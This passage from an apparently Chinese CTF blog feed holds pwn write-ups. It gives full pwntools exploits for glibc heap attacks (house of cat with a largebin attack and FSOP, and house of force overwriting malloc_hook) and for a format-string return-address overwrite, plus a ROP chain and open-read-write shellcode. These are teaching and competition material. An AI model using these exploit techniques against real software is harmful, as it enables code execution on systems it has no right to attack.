rcx!=0(FSOP)</span></span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">    fake_IO_FILE += p64(setcontext + <span class="number">61</span>) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x68</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x88</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>) <span class="comment"># _lock = a writable address</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x30</span>) <span class="comment"># vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span></span><br><span class="line">    payload = fake_IO_FILE + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(rop_addr) + p64(ret)</span><br><span class="line">    lg(<span class="string">&quot;stderr&quot;</span>,stderr)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x518</span>) </span><br><span class="line">    edit(<span class="number">4</span>,payload)</span><br><span class="line">    free(<span class="number">4</span>) <span class="comment"># 2</span></span><br><span class="line">    <span class="comment">#largebin attack</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1f70f0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x290</span>) + p64(_IO_list_all-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x540</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x530</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x530</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># mov rax, 0x67616c662f2e</span></span><br><span class="line">    <span class="comment"># push rax</span></span><br><span class="line">    sc = shellcraft.pushstr(<span class="string">&#x27;/home/dasctf/flag.txt&#x27;</span>)</span><br><span class="line">    sc += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x30   /* read size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_read</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x30   /* write size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    rop = p64(pop_rdi) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line">    rop += p64(pop_rsi) + p64(<span class="number">0x3000</span>) </span><br><span class="line">    rop += p64(pop_rdx) + p64(<span class="number">7</span>)</span><br><span class="line">    rop += p64(mprotect)</span><br><span class="line"></span><br><span class="line">    rop += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(setuid)</span><br><span class="line"></span><br><span class="line">    rop += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rsi) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line">    rop += p64(pop_rdx) + p64(<span class="number">0xff</span>)</span><br><span class="line">    rop += p64(read) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x530</span>)</span><br><span class="line">    edit(<span class="number">8</span>,rop)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x550</span>)</span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;setcontext + 61&quot;</span>,setcontext + <span class="number">61</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    s(asm(sc))</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>剩下2题是httpd，和logger</p><p>httpd会不了一点，要狠狠补webpwn了，写到logger的时候已经半夜2点了，太困了，遂眠</p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      <category domain="http://example.com/tags/largebin-attack/">largebin attack</category>
      
      <category domain="http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</category>
      
      <category domain="http://example.com/tags/io-file/">io_file</category>
      
      <category domain="http://example.com/tags/setcontext/">setcontext</category>
      
      <category domain="http://example.com/tags/house-of-cat/">house of cat</category>
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/mprotect/">mprotect</category>
      
      
      <comments>http://example.com/2024/08/29/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-pwn-%E9%83%A8%E5%88%86wp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>house of force</title>
      <link>http://example.com/2024/08/08/house-of-force/</link>
      <guid>http://example.com/2024/08/08/house-of-force/</guid>
      <pubDate>Thu, 08 Aug 2024 05:47:41 GMT</pubDate>
      
      <description>&lt;p&gt;glibc2.23与2.27之修改top chunk大小达到任意内存申请&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>glibc2.23与2.27之修改top chunk大小达到任意内存申请</p><span id="more"></span><p>例题是 [羊城杯 2023 决赛] easy_force</p><p>libc版本是2.23</p><p>2.23和2.27的libc缺少了对top chunk的size的检查</p><p>通过溢出修改top chunk大小为0xffffffffffffffff 可通过下面的检查，通过控制nb的值，即可完成任意内存申请</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* finally, do the allocation */</span></span><br><span class="line">p = av-&gt;top;</span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (p, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    check_malloced_chunk (av, p, nb);</span><br><span class="line">    <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后经过下面公式，malloc_size 其实就是上面的 nb，具体计算方法看这里<a href="https://www.cnblogs.com/ZIKH26/articles/16533388.html">关于house of force的学习总结 - ZikH26 - 博客园 (cnblogs.com)</a></p><p>这位师傅写的很详细，也很容易懂，我这里就只记录关键的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_size = target_addr - <span class="number">0x20</span> - top_chunk_addr</span><br></pre></td></tr></table></figure><p>然后我们在申请内存的时候可以写成，即可改malloc_hook为one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,malloc_hook-<span class="number">0x20</span>-top_chunk)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,p64(og))</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *0x4008A5</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28538</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;4.go away&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;want?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;write?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x21000</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27; &#x27;</span>),<span class="number">16</span>) - <span class="number">0x5ca010</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    top_chunk = <span class="built_in">int</span>(ru(<span class="string">b&#x27; &#x27;</span>),<span class="number">16</span>) + <span class="number">0x10</span></span><br><span class="line">    lg(<span class="string">&#x27;top_chunk&#x27;</span>,top_chunk)</span><br><span class="line"></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    <span class="comment">#malloc_got = elf.got[&#x27;malloc&#x27;]</span></span><br><span class="line">    lg(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    og = [<span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">    og = libc_base + og[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">2</span>,malloc_hook-<span class="number">0x20</span>-top_chunk)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x10</span>,p64(og))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;4.go away&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;want?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/house-of-force/">house of force</category>
      
      
      <comments>http://example.com/2024/08/08/house-of-force/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>非栈上格式化字符串漏洞</title>
      <link>http://example.com/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
      <guid>http://example.com/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</guid>
      <pubDate>Tue, 30 Jul 2024 02:06:04 GMT</pubDate>
      
      <description>&lt;p&gt;非栈上格式化字符串漏洞&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>非栈上格式化字符串漏洞</p><span id="more"></span><p>两道例题都是泄露stack地址和libc地址，然后修改返回地址为one_gadget</p><h3 id="DASCTF-2024-springboard"><a href="#DASCTF-2024-springboard" class="headerlink" title="[DASCTF 2024] springboard"></a>[DASCTF 2024] springboard</h3><p>5次机会，第一次泄露stack地址和libc地址</p><p>第二修改指针指向返回地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-1.png"></p><p><img src="/imgs/$%7Bfiilename%7D/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-2.png"></p><p>第三次 找到0xff337a87788的偏移，然后就能修改返回地址的值了(这里因为不是同一次运行，所以栈地址不一样)</p><p><img src="/imgs/$%7Bfiilename%7D/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-3.png"></p><p>第四和第五次同理，因为第二次和第三次只修改了2个字节，而one_gadget 有三个字节，所以还需要再返回地址+2处再修改一次即可</p><p><img src="/imgs/$%7Bfiilename%7D/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-4.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27808</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&#x27;keyword&#x27;</span>,<span class="string">b&#x27;%9$p%11$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xe0</span></span><br><span class="line">    lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">    og = og[<span class="number">2</span>] + libc_base</span><br><span class="line"></span><br><span class="line">    ret = stack &amp; <span class="number">0xffff</span></span><br><span class="line">    pd = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ret).encode()+ <span class="string">b&#x27;c%11$hn\x00&#x27;</span></span><br><span class="line">    sa(<span class="string">b&#x27;keyword&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    ret = og &amp; <span class="number">0xffff</span></span><br><span class="line">    pd = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ret).encode()+ <span class="string">b&#x27;c%37$hn\x00&#x27;</span></span><br><span class="line">    sa(<span class="string">b&#x27;keyword&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    ret = stack &amp; <span class="number">0xffff</span></span><br><span class="line">    pd = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ret+<span class="number">2</span>).encode()+ <span class="string">b&#x27;c%11$hn\x00&#x27;</span></span><br><span class="line">    sa(<span class="string">b&#x27;keyword&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    ret = (og&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    pd = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ret).encode()+ <span class="string">b&#x27;c%37$hn\x00&#x27;</span></span><br><span class="line">    sa(<span class="string">b&#x27;keyword&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="HGAME-2023-week2-YukkuriSay"><a href="#HGAME-2023-week2-YukkuriSay" class="headerlink" title="[HGAME 2023 week2]YukkuriSay"></a>[HGAME 2023 week2]YukkuriSay</h3><p>这题和上面的差不多，第一步先用while循环和printf函数，把栈上残留的数据泄露出来，得到libc地址和stack地址，然后在栈上布置返回地址，利用格式化字符串一次修改两个字节即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span 